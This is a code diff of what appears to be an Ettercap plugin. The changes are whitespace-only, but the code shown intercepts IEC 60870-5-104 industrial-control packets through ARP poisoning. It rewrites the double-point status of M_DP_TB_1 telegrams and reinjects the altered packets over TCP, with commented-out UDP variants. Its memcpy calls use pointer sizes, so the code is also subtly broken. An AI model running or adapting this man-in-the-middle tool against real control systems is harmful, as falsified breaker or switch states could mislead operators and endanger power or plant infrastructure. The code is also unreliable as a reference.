@@ -41,40 +41,40 @@ enum {I_FORMAT, S_FORMAT, U_FORMAT};
 
 /* IEC 60870-5-104 protocol start byte (0x68) */
 
-u_char START        = 0x68;
+u_char START = 0x68;
 
-/*	In this example we are only interested in modifying ASDU process telegrams with long time tag (7 octets).
-	Specifically double point information with time tag CP56Time2a (M_DP_TB_1)
-	To modify other IEC 104 packets, this ASDU value must be edited to the appropriate hexadecimal value.
+/* In this example we are only interested in modifying ASDU process telegrams with long time tag (7 octets).
+   Specifically double point information with time tag CP56Time2a (M_DP_TB_1)
+   To modify other IEC 104 packets, this ASDU value must be edited to the appropriate hexadecimal value.
 */
-u_char M_DP_TB_1	= 0X1f;
+u_char M_DP_TB_1 = 0X1f;
 
-/*	In this example we are only interested in modifying APCI packets that have the I-format (0x00).
-	To modify other APCI types, the control bytes in the structure should be edited following
-	the data stream of the packet on a packet analyzer (ex: Wireshark)
+/* In this example we are only interested in modifying APCI packets that have the I-format (0x00).
+   To modify other APCI types, the control bytes in the structure should be edited following
+   the data stream of the packet on a packet analyzer (ex: Wireshark)
 */
 struct apci_header {
-  u_char start;			//Start byte
-  u_int8 length;		//APDU Length
+  u_char start;		//Start byte
+  u_int8 length;	//APDU Length
   u_int8 control_f_1;	//Type (can be: I=LSB is 0; S=LSBs are 01; U=LSBs are 11) and Send sequence no.
   u_int8 control_f_2;	//Send sequence no. cont.
   u_int8 control_f_3;	//Receive sequence no.
   u_int8 control_f_4;	//Receive sequence no. cont.
 };
 
-/*	This structure also corresponds to M_DP_TB_1 packets.
-	To modify other IEC 104 packets, the ASDU information in the structure should be edited following
-	the data stream of the packet on a packet analyzer (ex: Wireshark)
+/* This structure also corresponds to M_DP_TB_1 packets.
+   To modify other IEC 104 packets, the ASDU information in the structure should be edited following
+   the data stream of the packet on a packet analyzer (ex: Wireshark)
 */
 struct asdu_header {
-  u_char type_id;			//1 to 21; 30 to 40; 45 to 51; 58 to 64; 70; 100 to 107; 110 to 113; 120 to 127 (see IEC 104 documentation)
+  u_char type_id;		//1 to 21; 30 to 40; 45 to 51; 58 to 64; 70; 100 to 107; 110 to 113; 120 to 127 (see IEC 104 documentation)
   
   //Data Unit Identifier
   u_char num_objects : 7;	//Number of objects
-  u_char sq : 1;			//Structure qualifier
-  u_char COT: 6;			//Cause of transmission
-  u_char PN : 1;			//Positive/Negative
-  u_char T : 1;				//Test bit
+  u_char sq : 1;		//Structure qualifier
+  u_char COT: 6;		//Cause of transmission
+  u_char PN : 1;		//Positive/Negative
+  u_char T : 1;			//Test bit
   #ifdef ADDR_TWO_OCTECTS
     short originator_addr;	//Originator address
   #else 
@@ -83,29 +83,29 @@ struct asdu_header {
   
   /*--------------------------------------------------------------------*/
   //Information Object 1 (out of N)
-  u_int IOA : 16; 			//8, 16 or 24 bits
+  u_int IOA : 16; 		//8, 16 or 24 bits
   u_char spacer;
   
   //In this example DIQ is used, this only applies to DIQ information elements
-  u_char dpi : 2;			//Double Point Information 
-  u_char blank : 2;			//spacers
-  u_char bl : 1;			//Not Blocked/Blocked
-  u_char sb : 1;			//Not Substituted/Substetuted
-  u_char nt : 1;			//Topical/Not Topical
-  u_char iv : 1;			//Valid/Invalid
+  u_char dpi : 2;		//Double Point Information 
+  u_char blank : 2;		//spacers
+  u_char bl : 1;		//Not Blocked/Blocked
+  u_char sb : 1;		//Not Substituted/Substetuted
+  u_char nt : 1;		//Topical/Not Topical
+  u_char iv : 1;		//Valid/Invalid
   
   //CP56Time2a time tag information
-  u_int ms : 16;			//Miliseconds
-  u_char min : 6;			//Minutes
-  u_char blank1 : 1;		//
-  u_char IV : 1;			//Valid/Invalid
-  u_char hour : 5;			//Hours
+  u_int ms : 16;		//Miliseconds
+  u_char min : 6;		//Minutes
+  u_char blank1 : 1;		
+  u_char IV : 1;		//Valid/Invalid
+  u_char hour : 5;		//Hours
   u_char blank2 : 2;		
-  u_char su : 1;			//Summer/Winter time
-  u_char day : 5;			//Calender day
-  u_char dow : 3;			//Day of the Week
-  u_char month : 4;			//Month
-  u_char year : 7;			//Year
+  u_char su : 1;		//Summer/Winter time
+  u_char day : 5;		//Calender day
+  u_char dow : 3;		//Day of the Week
+  u_char month : 4;		//Month
+  u_char year : 7;		//Year
 };
 
 /* prototypes is required for -Wmissing-prototypes */
@@ -215,7 +215,7 @@ static void parse_tcp(struct packet_object *po)
   /* We are interested in monitoring packets of type M_SP_TB_1 have the I format*/
   if(START == apci->start && I_FORMAT == get_type(apci->control_f_1) && M_DP_TB_1 == asdu->type_id) {
 
-	/* Debug message for original packet */
+    /* Debug message for original packet */
     USER_MSG("=========================");
     USER_MSG("\nOld Packet\n");
     print_apci(apci);
@@ -223,8 +223,8 @@ static void parse_tcp(struct packet_object *po)
     USER_MSG("=========================\n");
     
     /* We can't inject in unoffensive mode or in bridge mode or while the read flag (prevents the LAN from being 
-	   scanned) is active. 
-	*/
+       scanned) is active. 
+    */
     //Debug
     //USER_MSG("unoffensive:%d\n read:%d\n iface_bridge:%d\n", EC_GBL_OPTIONS->unoffensive, EC_GBL_OPTIONS->read, EC_GBL_OPTIONS->iface_bridge);
     if (EC_GBL_OPTIONS->unoffensive || EC_GBL_OPTIONS->read || (EC_GBL_OPTIONS->iface_bridge && EC_GBL_OPTIONS->iface_bridge<1000 && EC_GBL_OPTIONS->iface_bridge>0)) {
@@ -239,50 +239,50 @@ static void parse_tcp(struct packet_object *po)
     /* Modify the value */
     asdu->dpi = 1;
 	
-	/*	UDP requires destination mac address. As we are ARP poisoning, the original mac address must be copied
-	from a packet dissector to the packet destination.
-	[!]Comment lines for TCP
-	*/
-	//po->L2.dst[0] = 0x94;
-	//po->L2.dst[1] = 0xde;
-	//po->L2.dst[2] = 0x80;
-	//po->L2.dst[3] = 0x29;
-	//po->L2.dst[4] = 0x7a;
-	//po->L2.dst[5] = 0x0d;
+    /* UDP requires destination mac address. As we are ARP poisoning, the original mac address must be copied
+       from a packet dissector to the packet destination.
+       [!]Comment lines for TCP
+    */
+    //po->L2.dst[0] = 0x94;
+    //po->L2.dst[1] = 0xde;
+    //po->L2.dst[2] = 0x80;
+    //po->L2.dst[3] = 0x29;
+    //po->L2.dst[4] = 0x7a;
+    //po->L2.dst[5] = 0x0d;
 	
-	/* Copy information to original structure */
+    /* Copy information to original structure */
     memcpy(po->DATA.data, apci, sizeof(apci));
     memcpy(po->DATA.data + sizeof(struct apci_header), asdu, sizeof(asdu));
 
-     /* Debug message for altered packet */
+    /* Debug message for altered packet */
     USER_MSG("=========================");
     USER_MSG("\nNew Packet\n");
     print_apci(apci);
     print_asdu(asdu);
     USER_MSG("=========================\n");
 
-	/* Send modified packet (UDP)*/
-		//Send function args
-		//int 	send_udp (struct ip_addr *sip, struct ip_addr *tip, u_int8 *tmac, u_int16 sport, u_int16 dport, u_int8 *payload, size_t length)
-		//DEBUG message
-	//USER_MSG("po->L2.flags:%x, po->L2.flags:%x,po->L4.src:%x, po->L4.dst:%x\n", po->L2.dst[0], po->L2.dst[1], po->L4.src, po->L4.dst);
-		//Send function
-	//send_udp(&po->L3.src, &po->L3.dst, po->L2.dst, po->L4.src, po->L4.dst, po->DATA.data, po->DATA.disp_len);
+    /* Send modified packet (UDP)*/
+	//Send function args
+	//int 	send_udp (struct ip_addr *sip, struct ip_addr *tip, u_int8 *tmac, u_int16 sport, u_int16 dport, u_int8 *payload, size_t length)
+	//DEBUG message
+    //USER_MSG("po->L2.flags:%x, po->L2.flags:%x,po->L4.src:%x, po->L4.dst:%x\n", po->L2.dst[0], po->L2.dst[1], po->L4.src, po->L4.dst);
+	//Send function
+    //send_udp(&po->L3.src, &po->L3.dst, po->L2.dst, po->L4.src, po->L4.dst, po->DATA.data, po->DATA.disp_len);
 
 
     /* Send modified packet (TCP)*/
-		//Send funtion args
-		//int 	send_tcp (struct ip_addr *sip, struct ip_addr *tip, u_int16 sport, u_int16 dport, u_int32 seq, u_int32 ack, u_int8 flags, u_int8 *payload, size_t length)
-		//DEBUG message
+	//Send funtion args
+	//int 	send_tcp (struct ip_addr *sip, struct ip_addr *tip, u_int16 sport, u_int16 dport, u_int32 seq, u_int32 ack, u_int8 flags, u_int8 *payload, size_t length)
+	//DEBUG message
     //USER_MSG("po->L4.seq:%lu ,po->L4.ack: %lu, TH_ACK: %d, po->DATA.disp_len: %d\n",po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.disp_len );
-		//Send function
-	send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.data,po->DATA.disp_len );
+	//Send function
+    send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.data,po->DATA.disp_len );
   
-	/*	The packet object struct has 4 layers, but only 3 of them are relevant in this case:
-		L2 - Eth;
-		L3 - IP;
-		L4 - TCP/UDP (It detects the protocol automatically).	
-	*/
+    /*	The packet object struct has 4 layers, but only 3 of them are relevant in this case:
+	L2 - Eth;
+	L3 - IP;
+	L4 - TCP/UDP (It detects the protocol automatically).	
+    */
   
   }
 }
